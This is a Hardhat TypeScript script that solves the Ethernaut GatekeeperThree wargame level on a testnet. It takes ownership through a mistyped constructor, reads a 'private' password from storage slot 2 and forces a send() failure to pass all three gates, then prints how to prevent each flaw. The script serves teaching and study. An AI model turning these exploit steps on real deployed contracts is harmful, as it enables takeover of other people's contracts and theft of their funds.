import { ethers } from "hardhat";

/**
 * Execute the GatekeeperThree attack to pass all three gates and become the entrant
 * 
 * Usage:
 * ATTACK_CONTRACT_ADDRESS=0xYourAttackAddress TARGET_ADDRESS=0xGatekeeperThreeAddress npx hardhat run scripts/level-28-gatekeeper-three/attack.ts --network sepolia
 * 
 * Or use the simplified version:
 * ATTACK_CONTRACT_ADDRESS=0xYourAttackAddress npx hardhat run scripts/level-28-gatekeeper-three/attack.ts --network sepolia
 */
async function main() {
  console.log("Executing GatekeeperThree attack...\n");
  
  // Get the addresses from environment
  const attackContractAddress = process.env.ATTACK_CONTRACT_ADDRESS;
  const targetAddress = process.env.TARGET_ADDRESS;
  
  if (!attackContractAddress) {
    throw new Error("Environment variable ATTACK_CONTRACT_ADDRESS must be set");
  }
  
  // Get the signer account
  const [signer] = await ethers.getSigners();
  console.log(`Using signer account: ${signer.address}`);
  
  try {
    // Connect to the attack contract
    const attackContract = await ethers.getContractAt("GatekeeperThreeAttack", attackContractAddress);
    
    // Get the GatekeeperThree address from the attack contract
    const gatekeeperThreeAddress = targetAddress || await attackContract.target;
    const gatekeeperThree = await ethers.getContractAt("GatekeeperThree", gatekeeperThreeAddress);
    
    console.log("=== Contract Addresses ===");
    console.log(`Attack Contract: ${attackContractAddress}`);
    console.log(`GatekeeperThree: ${gatekeeperThreeAddress}`);
    
    // Check initial state
    let owner = await gatekeeperThree.owner();
    let allowEntrance = await gatekeeperThree.allowEntrance();
    let entrant = await gatekeeperThree.entrant();
    let trickAddress = await gatekeeperThree.trick();
    
    console.log("\n=== Initial State ===");
    console.log(`Owner: ${owner}`);
    console.log(`Allow Entrance: ${allowEntrance}`);
    console.log(`Entrant: ${entrant}`);
    console.log(`SimpleTrick: ${trickAddress}`);
    
    // Step 1: Become owner (if not already)
    if (owner.toLowerCase() !== attackContractAddress.toLowerCase()) {
      console.log("\n=== Step 1: Becoming Owner ===");
      console.log("Calling becomeOwner() to exploit construct0r() typo...");
      const tx1 = await attackContract.becomeOwner();
      await tx1.wait();
      console.log("✓ Successfully called construct0r()");
      
      owner = await gatekeeperThree.owner();
      console.log(`New owner: ${owner}`);
    } else {
      console.log("\n=== Step 1: Already Owner ✓ ===");
    }
    
    // Step 2: Setup SimpleTrick (if not already)
    if (trickAddress === ethers.ZeroAddress) {
      console.log("\n=== Step 2: Setting Up SimpleTrick ===");
      console.log("Calling setupTrick() to create SimpleTrick instance...");
      const tx2 = await attackContract.setupTrick();
      await tx2.wait();
      console.log("✓ SimpleTrick created");
      
      trickAddress = await gatekeeperThree.trick();
      console.log(`SimpleTrick address: ${trickAddress}`);
    } else {
      console.log("\n=== Step 2: SimpleTrick Already Setup ✓ ===");
      console.log(`SimpleTrick address: ${trickAddress}`);
    }
    
    // Step 3: Read password and pass gate two (if not already)
    if (!allowEntrance) {
      console.log("\n=== Step 3: Passing Gate Two ===");
      console.log("Reading password from SimpleTrick storage slot 2...");
      
      // Read password from storage slot 2 of SimpleTrick
      const passwordBytes = await ethers.provider.getStorage(trickAddress, 2);
      const password = BigInt(passwordBytes);
      
      console.log(`Password (from storage): ${password}`);
      console.log("Calling passGateTwo(password)...");
      
      const tx3 = await attackContract.passGateTwo(password);
      await tx3.wait();
      console.log("✓ Gate Two passed!");
      
      allowEntrance = await gatekeeperThree.allowEntrance();
      console.log(`Allow Entrance: ${allowEntrance}`);
    } else {
      console.log("\n=== Step 3: Gate Two Already Passed ✓ ===");
    }
    
    // Step 4: Fund the target contract
    const targetBalance = await ethers.provider.getBalance(gatekeeperThreeAddress);
    console.log("\n=== Step 4: Funding Target Contract ===");
    console.log(`Current balance: ${ethers.formatEther(targetBalance)} ETH`);
    
    if (targetBalance <= ethers.parseEther("0.001")) {
      const fundAmount = ethers.parseEther("0.002");
      console.log(`Sending ${ethers.formatEther(fundAmount)} ETH to target...`);
      
      const tx4 = await attackContract.fundTarget({ value: fundAmount });
      await tx4.wait();
      console.log("✓ Target funded");
      
      const newBalance = await ethers.provider.getBalance(gatekeeperThreeAddress);
      console.log(`New balance: ${ethers.formatEther(newBalance)} ETH`);
    } else {
      console.log("✓ Target already has sufficient balance");
    }
    
    // Step 5: Execute final attack
    console.log("\n=== Step 5: Executing Final Attack ===");
    console.log("Calling attack() to pass all gates...\n");
    
    console.log("📋 Gate Checks:");
    console.log(`  Gate One: msg.sender (${attackContractAddress}) == owner (${owner})? ${owner.toLowerCase() === attackContractAddress.toLowerCase() ? '✓' : '✗'}`);
    console.log(`  Gate One: tx.origin (${signer.address}) != owner (${owner})? ${owner.toLowerCase() !== signer.address.toLowerCase() ? '✓' : '✗'}`);
    console.log(`  Gate Two: allowEntrance (${allowEntrance}) == true? ${allowEntrance ? '✓' : '✗'}`);
    console.log(`  Gate Three: balance > 0.001 ETH? ${targetBalance > ethers.parseEther("0.001") ? '✓' : '✗'}`);
    console.log(`  Gate Three: owner.send() will fail? ✓ (attack contract reverts on receive)\n`);
    
    try {
      const tx5 = await attackContract.attack();
      console.log("Transaction hash:", tx5.hash);
      console.log("Waiting for confirmation...");
      
      const receipt = await tx5.wait();
      console.log("✓ Transaction confirmed in block:", receipt?.blockNumber || 'unknown');
      
      // Check final state
      entrant = await gatekeeperThree.entrant();
      
      console.log("\n=== Final State ===");
      console.log(`Entrant: ${entrant}`);
      
      if (entrant.toLowerCase() === signer.address.toLowerCase()) {
        console.log("\n✅ SUCCESS! You are now the entrant!");
        console.log("🎉 All three gates have been passed!");
        
        console.log("\n📚 What we exploited:");
        console.log("1. TYPO VULNERABILITY: construct0r() instead of constructor()");
        console.log("   - Allowed us to become owner via public function");
        console.log("2. STORAGE READING: Password stored in 'private' variable");
        console.log("   - Read directly from storage slot 2");
        console.log("3. SEND() FAILURE: Made our contract revert on receive");
        console.log("   - Caused owner.send() to return false, passing gate three");
        
        console.log("\n🔒 Prevention:");
        console.log("- Always use proper 'constructor' keyword (typos can be critical!)");
        console.log("- Never store sensitive data in storage (even if 'private')");
        console.log("- Use .call{value: amount}() instead of .send() for proper error handling");
        console.log("- Validate that send/transfer succeeded before continuing");
        
      } else {
        console.log("\n❌ Attack failed! You are not the entrant.");
        console.log(`Expected: ${signer.address}`);
        console.log(`Got: ${entrant}`);
      }
    } catch (error: any) {
      console.error("\n❌ Attack transaction failed:");
      if (error.message) {
        console.error("Error message:", error.message);
      }
      if (error.reason) {
        console.error("Reason:", error.reason);
      }
      
      // Debug info
      console.log("\n🔍 Debug Info:");
      const currentState = await attackContract.getState();
      console.log("Owner:", currentState.owner);
      console.log("AllowEntrance:", currentState.allowEntrance);
      console.log("SimpleTrick:", currentState.trickAddr);
      console.log("Target Balance:", ethers.formatEther(currentState.targetBalance), "ETH");
      
      throw error;
    }
    
  } catch (error: any) {
    console.error("\n❌ Error executing attack:");
    if (error.message) {
      console.error("Error message:", error.message);
    }
    if (error.reason) {
      console.error("Reason:", error.reason);
    }
    throw error;
  }
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
